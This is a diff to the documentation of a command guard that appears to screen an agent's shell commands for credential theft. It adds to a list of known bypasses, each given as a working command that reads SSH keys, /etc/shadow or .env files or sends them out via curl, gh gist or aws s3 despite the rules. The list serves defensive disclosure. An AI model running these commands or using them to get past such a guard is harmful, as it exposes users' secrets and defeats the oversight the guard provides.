@@ -138,6 +138,8 @@ Known limitations, each a way a command gets past the rules:
 - Upload syntaxes and network tools the guard does not model are not seen, such as `gh gist create .env` or `aws s3 cp .env s3://bucket/`.
 - Programs outside the reading-command list are not seen reading, so `tac ~/.ssh/id_rsa`, `dd if=$HOME/.ssh/id_rsa` or `jq . ~/.docker/config.json` passes.
 - A command run by a program the guard does not unwrap, or given its operands at run time, is not checked with those operands, so `find ~/.ssh -type f -exec cat {} +` and `ls ~/.ssh/id_* | xargs cat` pass.
+- Commands in a script file a command runs are not read, even a file the same command writes first (from a heredoc, `echo` or `printf`) or passes as `<( )`, so `printf 'cat ~/.ssh/id_rsa' > x.sh; sh x.sh`, `bash <(echo 'cat ~/.ssh/id_rsa')` and `source <(echo 'cat ~/.ssh/id_rsa')` pass.
+- A program word written as a brace list or a pathname pattern is not expanded, so `{cat,/etc/shadow}` and `/bin/ca[t] /etc/shadow` pass.
 - A directory that contains a credential location does not count as one, so `tar czf - ~ | curl -T - …`, `cp -r ~ /tmp/h` or the `grep` tool searching `~` passes.
 - A secret copied to another file first is sent under that file's name, so `cp .env /tmp/x && curl -F f=@/tmp/x …` passes.
 - Brace expansion is followed only in words up to 4096 characters long and for their first 1024 words, so a name at the end of a longer list (`{a,b}{a,b}…{a,b}{x,.env}`) passes.
